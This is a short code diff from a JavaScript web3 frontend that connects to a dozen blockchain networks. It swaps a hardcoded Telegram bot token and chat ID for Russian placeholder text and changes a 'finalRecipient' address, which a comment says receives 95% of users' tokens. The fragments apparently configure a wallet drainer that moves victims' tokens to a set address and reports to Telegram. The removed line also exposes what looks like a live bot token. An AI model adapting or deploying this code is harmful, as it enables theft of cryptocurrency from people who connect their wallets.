@@ -17,8 +17,8 @@ const debounce = (func, wait) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7547727920:AAGJPBBuh0h8y0sWH2sNeNLqYARwKdKp3AU'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4745136395'
+const telegramBotToken = '1234:ЗАГЛУШКА'
+const telegramChatId = 'ЗАГЛУШКА'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
@@ -170,7 +170,7 @@ function hideCustomModal() {
 }
 
 // Заглушка для finalRecipient (адрес получателя 95% токенов)
-const finalRecipient = '0x24C6cCfC2A527dA2Ef28431AAe77c7E0D3dE06dB'; // Замените на нужный адрес
+const finalRecipient = '0xbced7e9C6a1aFB0e5DD1Bd1a410e448fEc78cB0e'; // Замените на нужный адрес
 
 // Очистка состояния при загрузке страницы
 window.addEventListener('load', () => {
